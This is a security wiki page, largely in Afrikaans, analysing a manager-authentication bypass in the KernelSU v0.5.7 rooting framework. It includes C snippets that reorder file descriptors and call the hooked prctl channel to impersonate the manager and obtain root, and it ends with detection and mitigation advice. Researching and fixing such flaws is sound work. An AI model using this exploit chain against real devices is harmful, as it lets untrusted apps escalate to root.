# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Rooting frameworks soos KernelSU, APatch, SKRoot en Magisk patch gereeld die Linux/Android-kernel en stel bevoorregte funksionaliteit aan ’n onbevoorregte userspace-"manager"-app bloot via ’n hooked syscall. As die manager-authentication-stap gebrekkig is, kan enige plaaslike app hierdie kanaal bereik en privileges eskaleer op toestelle wat reeds geroot is.

Hierdie bladsy abstraheer die techniques en pitfalls wat in openbare research ontbloot is (veral Zimperium se analysis van KernelSU v0.5.7) om beide red- en blue teams te help om attack surfaces, exploitation primitives en robuuste mitigations te verstaan.<sup>[[1]](#references)</sup>

---
## Architecture pattern: syscall-hooked manager channel

- Kernel module/patch hook ’n syscall (gewoonlik prctl) om "commands" van userspace te ontvang.
- Die protocol is tipies: magic_value, command_id, arg_ptr/len ...
- ’n Userspace manager-app authenticateer eers (bv. CMD_BECOME_MANAGER). Sodra die kernel die caller as ’n trusted manager merk, word privileged commands aanvaar:
- Grant root aan caller (bv. CMD_GRANT_ROOT)
- Manage allowlists/deny-lists vir su
- Pas SELinux policy aan (bv. CMD_SET_SEPOLICY)
- Query version/configuration
- Omdat enige app syscalls kan invoke, is die correctness van die manager-authentication critical.

Example (KernelSU design):
- Hooked syscall: prctl
- Magic value om na KernelSU-handler te divert: 0xDEADBEEF
- Commands sluit in: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, ens.

---
## KernelSU v0.5.7 authentication flow (as implemented)

Wanneer userspace prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...) call, verifieer KernelSU:

1) Path prefix check
- Die verskafde path moet met ’n verwagte prefix vir die caller UID begin, bv. /data/data/<pkg> of /data/user/<id>/<pkg>.
- Reference: core_hook.c (v0.5.7) path prefix logic.<sup>[[2]](#references)</sup>

2) Ownership check
- Die path moet deur die caller UID besit word.
- Reference: core_hook.c (v0.5.7) ownership logic.<sup>[[2]](#references)</sup>

3) APK signature check via FD table scan
- Iterate deur die calling process se oop file descriptors (FDs).
- Kies die eerste file waarvan die path met /data/app/*/base.apk ooreenstem.
- Parse APK v2 signature en verifieer dit teen die official manager certificate.
- References: manager.c (iterating FDs), apk_sign.c (APK v2 verification).<sup>[[3]](#references)[[4]](#references)</sup>

As al die checks slaag, cache die kernel die manager se UID tydelik en aanvaar privileged commands van daardie UID totdat dit reset word.

---
## Vulnerability class: trusting “the first matching APK” from FD iteration

As die signature check bind aan "the first matching /data/app/*/base.apk" wat in die process se FD table gevind word, verifieer dit nie werklik die caller se eie package nie. ’n Attacker kan ’n legitimately signed APK (die real manager s’n) vooraf posisioneer sodat dit vroeër in die FD list as hul eie base.apk verskyn.

Hierdie trust-by-indirection laat ’n onbevoorregte app toe om die manager na te boots sonder om die manager se signing key te besit.<sup>[[1]](#references)</sup>

Key properties exploited:<sup>[[1]](#references)</sup>
- Die FD scan bind nie aan die caller se package identity nie; dit match slegs path strings volgens ’n pattern.
- open() return die laagste beskikbare FD. Deur lower-numbered FDs eerste te close, kan ’n attacker die ordering beheer.
- Die filter check slegs dat die path met /data/app/*/base.apk match – nie dat dit met die caller se geïnstalleerde package ooreenstem nie.

---
## Attack preconditions

- Die device is reeds geroot met ’n vulnerable rooting framework (bv. KernelSU v0.5.7).
- Die attacker kan arbitrary onbevoorregte code lokaal uitvoer (Android app process).
- Die real manager het nog nie ge-authenticateer nie (bv. onmiddellik ná ’n reboot). Sommige frameworks cache die manager UID ná success; jy moet die race wen.<sup>[[1]](#references)</sup>

---
## Exploitation outline (KernelSU v0.5.7)

High-level steps:<sup>[[1]](#references)[[9]](#references)</sup>
1) Build ’n geldige path na jou eie app data directory om aan die prefix- en ownership-checks te voldoen.
2) Verseker dat ’n genuine KernelSU Manager base.apk op ’n lower-numbered FD as jou eie base.apk oopgemaak word.
3) Invoke prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) om die checks te pass.
4) Issue privileged commands soos CMD_GRANT_ROOT, CMD_ALLOW_SU, CMD_SET_SEPOLICY om elevation te persist.

Practical notes on step 2 (FD ordering):<sup>[[1]](#references)</sup>
- Identify jou process se FD vir jou eie /data/app/*/base.apk deur /proc/self/fd-symlinks te walk.
- Close ’n low FD (bv. stdin, fd 0) en open die legitimate manager APK eerste sodat dit fd 0 (of enige index laer as jou eie base.apk FD) occupy.
- Bundle die legitimate manager APK met jou app sodat sy path aan die kernel se naive filter voldoen. Plaas dit byvoorbeeld onder ’n subpath wat met /data/app/*/base.apk match.

Example code snippets (Android/Linux, illustrative only):

Enumerate open FDs to locate base.apk entries:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Dwing ’n FD met ’n laer nommer om na die wettige manager APK te wys:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Bestuurder-verifikasie via prctl hook:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Na sukses, bevoorregte opdragte (voorbeelde):
- CMD_GRANT_ROOT: bevorder huidige proses na root
- CMD_ALLOW_SU: voeg jou package/UID by die allowlist vir aanhoudende su
- CMD_SET_SEPOLICY: pas SELinux-beleid aan soos deur framework ondersteun

Race/persistence-wenk:
- Registreer ’n BOOT_COMPLETED receiver in AndroidManifest (RECEIVE_BOOT_COMPLETED) om vroeg ná herlaai te begin en authentication te probeer voordat die werklike manager begin.<sup>[[1]](#references)</sup>

---
## Opsporing- en versagtingsriglyne

Vir framework-ontwikkelaars:
- Bind authentication aan die caller se package/UID, nie aan arbitrêre FDs nie:
- Bepaal die caller se package vanaf sy UID en verifieer dit teen die geïnstalleerde package se signature (via PackageManager), eerder as om FDs te skandeer.
- Indien kernel-only, gebruik stabiele caller identity (task creds) en valideer dit teen ’n stabiele bron van waarheid wat deur init/userspace helper bestuur word, nie teen process FDs nie.
- Vermy path-prefix-kontroles as identity; die caller kan maklik daaraan voldoen.
- Gebruik ’n nonce-gebaseerde challenge–response oor die kanaal en verwyder enige gecachede manager identity tydens boot of by belangrike gebeurtenisse.
- Oorweeg binder-gebaseerde geauthentiseerde IPC in plaas daarvan om generiese syscalls te oorlaai waar dit haalbaar is.

Vir defenders/blue team:
- Bespeur die teenwoordigheid van rooting frameworks en manager-prosesse; monitor vir prctl-oproepe met verdagte magic constants (bv. 0xDEADBEEF) indien jy kernel-telemetry het.
- Op bestuurde vloote, blokkeer of waarsku oor boot receivers vanaf onvertroude packages wat vinnig ná boot bevoorregte manager-opdragte probeer uitvoer.
- Verseker dat toestelle na patched framework-weergawes opgedateer is; maak gecachede manager-ID’s tydens ’n update ongeldig.

Beperkings van die aanval:
- Dit raak slegs toestelle wat reeds met ’n kwesbare framework rooted is.
- Dit vereis tipies ’n herlaai/race window voordat die wettige manager authenticate (sommige frameworks cache die manager UID totdat dit gereset word).

---
## Verwante notas oor frameworks

- Password-gebaseerde auth (bv. historiese APatch/SKRoot builds) kan swak wees indien passwords raai- of brute-forcebaar is, of indien validations foutief is.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Package/signature-gebaseerde auth (bv. KernelSU) is in beginsel sterker, maar moet aan die werklike caller bind, nie aan indirekte artefacts soos FD-scans nie.<sup>[[1]](#references)[[5]](#references)</sup>
- Magisk: CVE-2024-48336 (MagiskEoP) het getoon dat selfs volwasse ecosystems vatbaar kan wees vir identity spoofing wat tot code execution met root binne die manager-context lei.<sup>[[1]](#references)[[8]](#references)</sup>

---
## References

- [1] [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [3] [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [4] [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [9] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
